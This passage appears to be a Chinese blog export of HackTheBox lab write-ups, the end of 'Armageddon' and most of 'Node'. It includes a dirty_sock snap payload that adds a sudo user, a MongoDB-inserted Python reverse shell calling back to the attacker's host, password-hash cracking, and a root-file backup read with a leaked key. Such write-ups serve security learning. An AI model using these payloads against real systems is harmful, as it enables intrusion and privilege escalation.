admin\n```\n\n爆破成功\n\n![](Hackthebox-Armageddon/image19.png)\n\n密码为 booboo\n\n现在咱们直接ssh登录就可以了\n\n```\nssh brucetherealadmin@10.10.10.233\n```\n\n![](Hackthebox-Armageddon/image20.png)\n\nOK，咱们现在总算是有一个完整的用户权限了\n\n![](Hackthebox-Armageddon/image21.png)\n\n成功获得user权限的flag\n\n**权限提升**\n\n咱们使用 `sudo –l` 来查看一下 sudo 权限\n\n![](Hackthebox-Armageddon/image22.png)\n\n咱们可以不使用密码就调用 root 权限安装 snap，那思路就有了呀，搞起来兄弟们\n\n生成一个snap的马\n\n参考链接：\n\n> Privilege Escalation in Ubuntu Linux (dirty_sockv2 exploit)：https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html\n\n> Playing with Dirty Sock：https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html\n\n生成指令：\n\n```\npython2 -c 'print\"aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw\"+ \"A\"*4256 + \"==\"' | base64 -d > exploit.snap\n```\n\n![](Hackthebox-Armageddon/image23.png)\n\n直接运行改文件，发现还有一点错误，需要想办法解决一下\n\n![](Hackthebox-Armageddon/image24.png)\n\n加上 --devmode 成功安装\n\n```\nsudo /usr/bin/snap install --devmode exploit.snap\n```\n\n![](Hackthebox-Armageddon/image25.png)\n\n切换到 dirty_sock 用户，密码也是 dirty_sock\n\n查看一下权限\n\n![](Hackthebox-Armageddon/image26.png)\n\n提权成功\n\n![](Hackthebox-Armageddon/image27.png)\n\n成功拿到root权限的flag\n","tags":["Hackthebox"]},{"title":"Node - Hackthebox","url":"/2022/08/01/Hackthebox/Medium/Hackthebox-Node/","content":"\n# Hackthebox - Node\n# 靶场信息\n![](Hackthebox-Node/1696fad6-1739-400f-9bd9-90de4805f3d0.png)\n\n# 靶场类型\n![](Hackthebox-Node/e672c742-1d71-49b3-8eb7-6c7e6075f1b1.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.58\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-12 09:40 CST\nNmap scan report for 10.10.10.58\nHost is up (0.57s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT     STATE SERVICE            VERSION\n22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)\n|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)\n|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)\n3000/tcp open  hadoop-tasktracker Apache Hadoop\n| hadoop-tasktracker-info: \n|_  Logs: /login\n|_http-title: MyPlace\n| hadoop-datanode-info: \n|_  Logs: /login\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.2 - 4.9 (92%), Crestron XPanel control system (90%), Linux 3.13 (89%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 3.5 (87%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT       ADDRESS\n1   647.66 ms 10.10.14.1\n2   647.71 ms 10.10.10.58\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 93.80 seconds\n```\n## Http\n![](Hackthebox-Node/b12e40e3-bf31-441b-be2f-8f9cd55e0a69.png)\n\n这边首页面看到有个登陆点，直接去看看\n\n![](Hackthebox-Node/61183a1a-65fc-4b2c-a797-a855894e682b.png)\n\n测试了一下弱口令，没进去，也没什么其他可以点的点了，fuzz 也没找到什么东西\n\n![](Hackthebox-Node/fe9af40b-2fd9-4dbb-8855-1c9235d7f2d9.png)\n\n在主页抓到一个 js，里面有一个地址 /api/users，去看一下\n\n```bash\n[{\"_id\":\"59a7365b98aa325cc03ee51c\",\"username\":\"myP14ceAdm1nAcc0uNT\",\"password\":\"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af\",\"is_admin\":true},\n{\"_id\":\"59a7368398aa325cc03ee51d\",\"username\":\"tom\",\"password\":\"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240\",\"is_admin\":false},\n{\"_id\":\"59a7368e98aa325cc03ee51e\",\"username\":\"mark\",\"password\":\"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73\",\"is_admin\":false},\n{\"_id\":\"59aa9781cced6f1d1490fce9\",\"username\":\"rastating\",\"password\":\"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0\",\"is_admin\":false}]\n```\n去尝试解密一下\n\n```bash\nusername = myP14ceAdm1nAcc0uNT\npassword = manchester\n```\n成功解密出 myP14ceAdm1nAcc0uNT 的密码，这是一个管理员账户，去登陆页面登录一下\n\n# 漏洞利用\n![](Hackthebox-Node/b3fb1d76-8f41-4e86-929f-b8694d6abe2e.png)\n\n成功登陆，然后有一个备份文件可以下载，下载一下\n\n```bash\nwget --header \"Cookie: connect.sid=s%3AjDIfsWcluCPkFQHEKYIaZu2c5fEgPznp.td17K8ciAiS8uXhzf4h0SM71BuRxWE%2BdLoPQvRI9XkQ\" http://10.10.10.58:3000/api/admin/backup\n```\n这个文件下载存在一些问题，尝试多次都会在大概 0.6% 左右的进度停止下载\n\n所以我们用 wget 进行自动多次尝试下载，然后挂着等下载完成吧\n\n如果还是不行，就尝试用 curl 进行请求\n\n```bash\ncurl -s -XGET -b 'connect.sid=s%3AjDIfsWcluCPkFQHEKYIaZu2c5fEgPznp.td17K8ciAiS8uXhzf4h0SM71BuRxWE%2BdLoPQvRI9XkQ' http://10.10.10.58:3000/api/admin/backup -o myplace.backup\n```\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# file myplace.backup \nmyplace.backup: ASCII text, with very long lines (64652), with no line terminators\n```\n查看了一下内容和类型，感觉像是 base64 编码，去解码一下\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# cat myplace.backup | base64 -d > unknow                                                                                                                               \n\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# file unknow \nunknow: Zip archive data, at least v1.0 to extract, compression method=store\n\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# mv unknow myplace.zip\n```\n是一个 zip 类型的，那就尝试解压一下\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# unzip myplace.zip\nArchive:  myplace.zip\n   creating: var/www/myplace/\n[myplace.zip] var/www/myplace/package-lock.json password:\n```\n需要一个解压密码\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# fcrackzip -D -p /usr/share/wordlists/rockyou.txt  myplace.zip\npossible pw found: magicword\n```\n解压密码出来了，去解压一下\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop/var/www/myplace]\n└─# ls -la\n总用量 56\ndrwxr-xr-x  4 root root  4096  9月  3  2017 .\ndrwxr-xr-x  3 root root  4096  7月 12 20:24 ..\n-rw-rw-r--  1 root root  3861  9月  2  2017 app.html\n-rw-rw-r--  1 root root  8058  9月  3  2017 app.js\ndrwxr-xr-x 69 root root  4096  9月  2  2017 node_modules\n-rw-rw-r--  1 root root   283  9月  2  2017 package.json\n-rw-r--r--  1 root root 21264  9月  2  2017 package-lock.json\ndrwxrwxr-x  6 root root  4096  9月  2  2017 static\n```\n有一些文件，到处看看有没有有用的东西吧\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop/var/www/myplace]\n└─# grep -Ri password .\n```\n使用上面的命令进行筛选，我们看到有一个 mongodb\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop/var/www/myplace]\n└─# cat app.js\n\nconst express     = require('express');\nconst session     = require('express-session');\nconst bodyParser  = require('body-parser');\nconst crypto      = require('crypto');\nconst MongoClient = require('mongodb').MongoClient;\nconst ObjectID    = require('mongodb').ObjectID;\nconst path        = require(\"path\");\nconst spawn        = require('child_process').spawn;\nconst app         = express();\nconst url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';\nconst backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';\n```\n查看 app.js 其中和 mangodb 有关的只有 const url 这一句\n\n所以我们到了一个账号密码\n\n```bash\nusername = mark\npassword = 5AYRft73VtFpc84k\n```\n目前只有 22 和 3000 端口打开，3000 端口我们已经是 admin 权限了，自然不可能，所以应该是 22 端口\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# ssh mark@10.10.10.58                       \nThe authenticity of host '10.10.10.58 (10.10.10.58)' can't be established.\nED25519 key fingerprint is SHA256:l5rO4mtd28sC7Bh8t7rHpUxqmHnGYUDxX1DHmLFrzrk.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.58' (ED25519) to the list of known hosts.\nmark@10.10.10.58's password: \n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\n.-. \n        .-'``(|||) \n     ,`\\ \\    `-`.                 88                         88 \n    /   \\ '``-.   `                88                         88 \n  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 \n (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 \n  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 \n    \\   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 \n     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' \n        `-..-(   ) \n              `-` \n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nLast login: Wed Sep 27 02:33:14 2017 from 10.10.14.3\nmark@node:~$ whoami&&id\nmark\nuid=1001(mark) gid=1001(mark) groups=1001(mark)\n```\n成功拿到 user 权限\n\n进来后在用户目录下没有看到 flag 文件\n\n/home/tom/user.txt 通过 find 查找，在 tom 目录下找到了 flag 文件\n\n```bash\nmark@node:/home/tom$ cat user.txt \ncat: user.txt: Permission denied\n```\n但是我们没有权限\n\n# 权限提升\n## Tom\n```bash\nmark@node:/home$ ps aux | grep tom\ntom       1231  0.0  8.6 1033968 65472 ?       Ssl  02:21   0:22 /usr/bin/node /var/www/myplace/app.js\ntom       1238  0.0  5.7 1008568 43220 ?       Ssl  02:21   0:07 /usr/bin/node /var/scheduler/app.js\nmark     16416  0.0  0.1  14228   932 pts/0    S+   13:43   0:00 grep --color=auto tom\n```\n查看一下 Tom 运行的文件\n\n```bash\nmark@node:/home$ cat /var/scheduler/app.js\nconst exec        = require('child_process').exec;\nconst MongoClient = require('mongodb').MongoClient;\nconst ObjectID    = require('mongodb').ObjectID;\nconst url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';\n\nMongoClient.connect(url, function(error, db) {\n  if (error || !db) {\n    console.log('[!] Failed to connect to mongodb');\n    return;\n  }\n\n  setInterval(function () {\n    db.collection('tasks').find().toArray(function (error, docs) {\n      if (!error && docs) {\n        docs.forEach(function (doc) {\n          if (doc) {\n            console.log('Executing task ' + doc._id + '...');\n            exec(doc.cmd);\n            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });\n          }\n        });\n      }\n      else if (error) {\n        console.log('Something went wrong: ' + error);\n      }\n    });\n  }, 30000);\n\n});\n```\n可以看到 /var/scheduler/app.js 连接了名为 scheduler 的 mongodb 数据库，在名为 tasks 的集合中搜索文档并执行 ‘cmd’ 字段\n\n让我们连接到 mongodb 并在任务集合中插入一个新文档。我们希望用户 tom 执行的命令将在“cmd”字段中。\n\n```bash\nmark@node:~$ mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k\nMongoDB shell version: 3.2.16\n```\n```bash\ndb.tasks.insert({\"cmd\":\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.6\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"sh\\\")'\"});\n```\n使用 nc 监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nc -nvlp 4444                                      \nlistening on [any] 4444 ...\nconnect to [10.10.14.6] from (UNKNOWN) [10.10.10.58] 41470\n$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")';\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")';\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\ntom@node:/$ whoami&&id\nwhoami&&id\ntom\nuid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)\n```\n成功提权到 Tom\n\n```bash\ntom@node:~$ pwd\npwd\n/home/tom\ntom@node:~$ ls   \nls\nuser.txt\ntom@node:~$ cat user.txt\ncat user.txt\ne1156acc3574e04b06908ecf76be91b1\n```\n成功获取到 user 权限的 flag 文件\n\n## Root\n```bash\nfind / -type f -perm -4000 2>/dev/null\n```\n检查一波 suid 信息 显示 tom 具有的权限\n\n```bash\ntom@node:/$ find / -type f -perm -4000 2>/dev/null\nfind / -type f -perm -4000 2>/dev/null\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/snapd/snap-confine\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/usr/lib/openssh/ssh-keysign\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/local/bin/backup\n/usr/bin/chfn\n/usr/bin/at\n/usr/bin/gpasswd\n/usr/bin/newgidmap\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/newuidmap\n/bin/ping\n/bin/umount\n/bin/fusermount\n/bin/ping6\n/bin/ntfs-3g\n/bin/su\n/bin/mount\n```\n看起来最异常的就是 /usr/local/bin/backup 了\n\n```bash\ntom@node:/$ file /usr/local/bin/backup\nfile /usr/local/bin/backup\n/usr/local/bin/backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped\n```\n查看一下文件格式可以确定是一个二进制文件\n\n检查一下文件 /var/www/myplace/app.js\n\n```bash\n                    'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',\n          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',\n          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',\n          'QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',\n          'QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~\"\"??9VWQQQQQQQQQQQQQQQQQQQ',\n          'QQQQQQQQQQQQQP\\'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,\"?9$QQQQQQQQQQQQQQ',\n          'QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ',\n          'QQQQQQQQQQW\\' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ',\n          'QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ',\n          'QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ',\n          'QQQQQQQP\\'.yQQQQQQQQQQQP\"       <wa,.!4WQQQQQQQWdWP??!\"??4WWQQQWQQc ?QWQQQQQ',\n          'QQQQQP\\'_a.<aamQQQW!<yF \"!` ..  \"??$Qa \"WQQQWTVP\\'    \"??\\' =QQmWWV?46/ ?QQQQQ',\n          'QQQP\\'sdyWQP?!`.-\"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ',\n          'QQ[ j@mQP\\'adQQP4ga, -????\" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?\"`  -?QzQ7L ]QQQ',\n          'QW jQkQ@ jWQQD\\'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc \"4QQQQa   .QP4QQQQfWkl jQQQ',\n          'QE ]QkQk $D?`  waa \"?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`\"QQQD\\Qf(.QWQQ',\n          'QQ,-Qm4Q/-QmQ6 \"WWQma/  \"??QQQQQQL 4W\"- -?$QQQQWP`s,awT$QQQ@  \"QW@?$:.yQQQQ',\n          'QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??\\'<mWWWWWQW?^  ` ]6QQ\\' yQQQQQ',\n          'QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  \"????9VWaamQWV???\"  a j/  ]QQf jQQQQQQ',\n          'QQQQQQw,\"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ',\n          'QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ',\n          'QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ',\n          'QQQQQQQQQQ,\"$WQQWQQQQg,.\"?QQQQ\\'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ',\n          'QQQQQQQQQWQa ?$WQQWQQQQQa,.\"?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ',\n          'QQQQQQQQQQWWma \"9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ',\n          'QQQQQQQQQQQQQQQws \"Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ',\n          'QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ',\n          'QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ',\n          'QQQQQQQQQQQQQQQQQQQQQQWWQQga,-\"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ',\n          'QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW',\n          'QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ',\n          'QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^\"!???????!^`_saQWWQQQQQQQ',\n          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ',\n          'QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ',\n```\n看到一个有趣的东西，应该还有其他的东西\n\n```bash\nconst backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';\n```\n拿到了一个 key\n\n```bash\napp.get('/api/admin/backup', function (req, res) {\n    if (req.session.user && req.session.user.is_admin) {\n      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);\n      var backup = '';\n```\nbackup 的运行格式是 backup -q key 文件目录，然后就会把我们指定的目录给打包为压缩文件\n\n还记得我们在 app.js 中找到的密钥 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 吗？派上用场了\n\n```bash\ntom@node:/usr/local/bin$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root\n<ac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root         \n [+] Finished! Encoded backup is below:\n\nUEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==\n```\n```bash\nUEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==\n```\n得到了一串 base64 码，进行查看并解压\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# base64 -d base > base_encode \n\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# file base_encode \nbase_encode: Zip archive data, at least v5.1 to extract, compression method=AES 